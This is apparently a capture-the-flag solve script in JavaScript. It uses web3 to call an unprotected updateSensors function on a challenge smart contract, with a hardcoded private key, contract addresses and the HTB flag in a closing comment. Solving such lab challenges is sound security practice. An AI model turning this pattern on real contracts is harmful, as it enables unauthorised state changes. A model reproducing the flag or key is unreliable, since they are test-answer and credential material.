var Web3 = require('web3');
var provider = 'http://165.22.116.7:31173/';
var web3Provider = new Web3.providers.HttpProvider(provider);
var web3 = new Web3(web3Provider);

var Private_key = "0x960def7462ab1a2dff0087065ee082c6c7ed04b236df05fffddc30da160f0604"
var Address = "0x629834f7BCa64a3f51661F3f94Ff7D6F6688055a"
var Target_contract = "0x7D2eb4b269bF10743783D4a6C153a31c8164747E"
var Setup_contract = "0x9B5e58200b6c371bc540b3f3d6F4A40431A52101"

// web3.eth.getBlockNumber().then((result) => {
//   console.log("Latest Block is ",result);
// });

// web3.eth.getBalance(Target_contract).then(console.log);

let contract = new web3.eth.Contract([{
  
        "inputs": [
          {
            "internalType": "uint256",
            "name": "version",
            "type": "uint256"
          }
        ],
        "name": "updateSensors",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "updated",
        "outputs": [
          {
            "internalType": "bool",
            "name": "",
            "type": "bool"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      }],Target_contract)

contract.methods.updateSensors(10).send({from:Address}).then(contract.methods.updated().call().then(console.log))

//FLAG=HTB{9P5_50FtW4R3_UPd4t3D}